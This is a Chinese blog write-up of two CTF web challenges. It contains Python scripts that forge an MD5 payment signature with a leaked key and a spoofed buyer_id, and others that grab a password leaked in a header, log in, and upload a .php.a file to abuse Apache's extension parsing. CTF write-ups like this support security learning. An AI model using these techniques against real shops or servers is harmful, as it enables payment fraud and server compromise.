---
title: 安恒月赛（十）web-2题writeup
date: 2018.10.27 21:54
tags:
  - CTF
  - 信息安全
  - web安全
  - write-up
categories: 信息安全
---
哎 ，好久没接触信安了，今天恰好看到安恒月赛ctf。想着稍微试试玩玩吧，才写了两题web，其他没看（其他方向暂时不会额）。随手记录下
<!-- more -->
## shop
> http://101.71.29.5:10006/

这题是Django的简单审计题，逻辑绕过。（后才知道题目原意考哈希长度扩展攻击）


![index主页](https://upload-images.jianshu.io/upload_images/14657587-b38a238f1be76d4b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


下载源码看了几个views视图函数。简单了解这个商场订单流程。关键是这里

![sign签名方式](https://upload-images.jianshu.io/upload_images/14657587-ad460f3a10a38f90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


sign签名方法。后再看

![check验证支付订单](https://upload-images.jianshu.io/upload_images/14657587-f9235eb24cc2267b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)




发现在checkPayment函数中，用户是通过前端传过来的buyer_id来确定用户id再去数据库找到这个用户，而没有用自带的request.user方法，这样就能利用了，伪造超级用户付款。因为超级用户扣款并不用扣point，（上面逻辑中写了），查看到备份数据库（db.sqlite3.bak）中的各种信息，构造如下

```python
from hashlib import md5
# RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = "zhinianyuxin".encode('utf-8')
with open('secret.key', 'rb') as f:
	RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = f.read()
form = {
		'order_id': 706,
		'buyer_id': 16,
		'good_id': 38,
		'buyer_point': 300,
		'good_price': 888,
		'order_create_time': 1540646597.474468
	}
str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + '&'.join([f'{i}={form[i]}' for i in form]).encode('utf-8')
sign = md5(str2sign).hexdigest()
print(sign)


-------------------------------------------------
1caeb54aacd80944e6b3d836f9b773e6
```

在前端修改signature还有各个input中的值，check是从request.body中取回来的。修改成和构造一样的值

![前端修改保持和构造值一样](https://upload-images.jianshu.io/upload_images/14657587-f38a5e18a8a350aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

提交得flag

![flag](https://upload-images.jianshu.io/upload_images/14657587-a4bc52b9be408e78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



## 手速要快

> http://101.71.29.5:10010/

简单正常login

![1540630910062.png](https://upload-images.jianshu.io/upload_images/14657587-7fc6a8b40a3c1a31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


返回包头部

```http
HTTP/1.1 200 OK
Date: Sat, 27 Oct 2018 17:02:08 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.1.14
X-Powered-By: PHP/7.1.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
password: 5fc4fe400ae12342fb01ca3da55dc95b
Vary: Accept-Encoding,User-Agent
Content-Encoding: gzip
X-Service-Uid: app-1.1.1
Content-Length: 231
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

有password这个字段。那上脚本吧，



> 访问后使用头部password的字段再post提交

```python
import requests

r = requests.get('http://101.71.29.5:10010/index.php?login=')
password = r.headers.get("password")
# print(password)
cookie = r.cookies['PHPSESSID']
# print(r.headers.get("password"))
# print(r.cookies['PHPSESSID'])
# print(r.text,'\n',r.headers)

data = {'password': r.headers.get("password"),'submit_password':''}
r = requests.post('http://101.71.29.5:10010/login.php',data=data,cookies={'PHPSESSID':cookie})
print(r.text,'\n',r.headers)
```

打印出来的源代码为

```html
<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="UTF-8">
        <title>can you find the flag?</title>
</head>
<body>
                <form action='upload.php' method='POST' enctype='multipart/form-data'>
                <input type='file' name='file'>
                <button type='submit_file' name='submit_file'>upload</button>
                </form><form action='logout.php' method='POST'>
                <button type='logout'name='logout'>logout</button>
                </form></body>
</html>
```



> 访问后使用头部password的字段再post提交，再提交上传文件

最终脚本为

```python
import requests

r = requests.get('http://101.71.29.5:10010/index.php?login=')
password = r.headers.get("password")
# print(password)
cookie = r.cookies['PHPSESSID']
# print(r.headers.get("password"))
# print(r.cookies['PHPSESSID'])
# print(r.text,'\n',r.headers)

data = {'password': r.headers.get("password"),'submit_password':''}
r = requests.post('http://101.71.29.5:10010/login.php',data=data,cookies={'PHPSESSID':cookie})

files = {
	'file':("test.php.a",open('test.php','r'),'multipart/form-data')
}
data = {'submit_file':''}
r = requests.post('http://101.71.29.5:10010/upload.php',cookies={'PHPSESSID':cookie},data=data,files=files)
print(r.text,'\n',r.headers)
```

返回内容

```http
You upload is save at:uploads/test.php.a
 {'Date': 'Sat, 27 Oct 2018 15:38:18 GMT', 'Server': 'Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.1.14', 'X-Powered-By': 'PHP/7.1.14', 'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Pragma': 'no-cache', 'Vary': 'User-Agent', 'X-Service-Uid': 'app-1.1.1', 'Content-Length': '40', 'Keep-Alive': 'timeout=2, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
```



> 上传文件？

php后缀不能直接上传。看服务器是Apache的，解析漏洞，于是上传test.php.a



![ah3.jpg](https://upload-images.jianshu.io/upload_images/14657587-86d942814ed1f13d.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

